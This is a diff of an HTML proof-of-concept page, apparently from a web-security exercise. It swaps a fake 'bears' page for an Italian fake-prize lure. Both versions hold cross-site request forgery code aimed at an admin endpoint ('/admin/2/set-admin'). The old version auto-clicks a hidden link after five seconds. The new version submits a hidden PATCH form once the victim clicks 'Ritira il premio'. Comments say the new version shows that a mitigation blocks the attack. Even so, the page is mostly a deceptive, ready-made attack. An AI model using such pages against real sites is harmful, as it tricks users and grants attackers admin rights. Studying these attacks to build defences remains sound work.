@@ -1,132 +1,95 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
-    <title>Cat Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premio Speciale!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            overflow: hidden;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: url('https://images.pexels.com/photos/1766838/pexels-photo-1766838.jpeg') no-repeat center center fixed;
-            background-size: cover;
+            margin: 0;
         }
         .container {
-            max-width: 600px;
-            text-align: center;
-            background-color: rgba(255, 255, 255, 0.8);
-            padding: 20px;
+            background: white;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            padding: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 400px;
         }
-        
-        .button {
-            display: inline-block;
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #007bff;
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 30px;
+        }
+        button {
+            background: #667eea;
+            color: white;
             border: none;
+            padding: 15px 30px;
             border-radius: 5px;
+            font-size: 16px;
             cursor: pointer;
-            text-decoration: none;
-            animation: pulse 2s infinite;
+            transition: background 0.3s;
         }
-        .button:hover {
-            background-color: #0056b3;
+        button:hover {
+            background: #5a67d8;
         }
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
-            }
-            50% {
-                transform: scale(1.1);
-                box-shadow: 0 0 25px rgba(0, 123, 255, 0.5);
-            }
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
-            }
-        }
-        .message {
+        .hidden-form {
             display: none;
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #dff0d8;
-            color: #3c763d;
-            border: 1px solid #d6e9c6;
-            border-radius: 5px;
-        }
-        .confetti {
-            position: fixed;
-            width: 20px;
-            height: 20px;
-            background: red;
-            z-index: 9999;
-            animation: explode 2s ease-out forwards;
-        }
-        @keyframes explode {
-            0% {
-                transform: scale(1) translate(0, 0);
-                opacity: 1;
-            }
-            100% {
-                transform: scale(0) translate(var(--x), var(--y));
-                opacity: 0;
-            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Welcome to the Bears Page</h1>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">SCOPRI IL TUO ORSETTO</a>
-        <p>Here you can learn everything about bears. Bears are big, carnivorous mammals that are often visible in forests. They are known for their agility, playfulness, and ability to hunt humans.</p>
-        <img src="https://placebear.com/200/300" alt="Cute bear">
-        <br><br>
-        <!-- update user id according to the attacker id -->
-        <a id="csrf-link" href="http://internal.admin:8000/admin/2/set-admin" class="button" style="display: none;">Adopt a cute bear for free!</a>
-        <a href="https://www.bornfree.org.uk/adopt/brown-bear" class="button" target="_blank">ADOTTAMI, E' GRATIS :)</a>
-        <div id="message" class="message">Your bear thanks you :)</div>
+        <h1>🎉 Congratulazioni!</h1>
+        <p>Hai vinto un premio speciale! Clicca il bottone per ritirarlo.</p>
+        <button id="btn-premio" onclick="premi()">Ritira il premio</button>
     </div>
-    
+
+    <!-- Form nascosto per l'attacco CSRF -->
+    <div class="hidden-form">
+        <form id="csrf-form" action="http://cyber.blog:8000/admin/2/set-admin" method="POST">
+            <input type="hidden" name="_method" value="PATCH">
+        </form>
+    </div>
+
     <script>
-        setTimeout(() => {
-            // Recupera il bottone e simula il click
-            const csrfLink = document.getElementById("csrf-link");
-            csrfLink.click();
-        }, 5000);
-        
-        function launchConfetti() {
-            for (let i = 0; i < 100; i++) {
-                createConfetti();
-            }
-        }
-        
-        function createConfetti() {
-            const confetti = document.createElement('div');
-            confetti.classList.add('confetti');
-            confetti.style.left = '50vw';
-            confetti.style.top = '50vh';
-            confetti.style.setProperty('--x', (Math.random() - 0.5) * 300 + 'vw');
-            confetti.style.setProperty('--y', (Math.random() - 0.5) * 300 + 'vh');
-            confetti.style.backgroundColor = getRandomColor();
-            document.body.appendChild(confetti);
+        function premi() {
+            // Pagina di distrazione per la vittima
+            alert('Controlla la tua email per il premio!');
             
-            setTimeout(() => {
-                confetti.remove();
-            }, 2000);
-        }
-        
-        function getRandomColor() {
-            const colors = ['red', 'blue', 'green', 'yellow', 'orange', 'purple'];
-            return colors[Math.floor(Math.random() * colors.length)];
+            // Dopo 5 secondi lancia l'attacco CSRF
+            setTimeout(function() {
+                // NOTA: Non è possibile usare fetch() o XMLHttpRequest per inviare
+                // i cookie di sessione in richieste cross-origin a causa delle
+                // policy SameSite=Lax e CORS.
+                // 
+                // L'unico modo per far inviare i cookie è usare un form HTML
+                // che fa una navigazione top-level (il browser invia i cookie
+                // con SameSite=Lax nelle navigazioni GET top-level).
+                //
+                // Tuttavia, con il metodo PATCH il middleware CSRF di Laravel
+                // bloccherà la richiesta perché manca il token _token.
+                //
+                // Questo script dimostra che l'attacco NON funziona più dopo
+                // la mitigazione (rotte cambiate da GET a PATCH).
+                
+                var form = document.getElementById('csrf-form');
+                form.submit();
+                
+                // Se l'attacco fosse riuscito (prima della mitigazione),
+                // l'utente target sarebbe diventato admin.
+                // Dopo la mitigazione, la richiesta viene bloccata con errore 419.
+            }, 5000);
         }
     </script>
 </body>
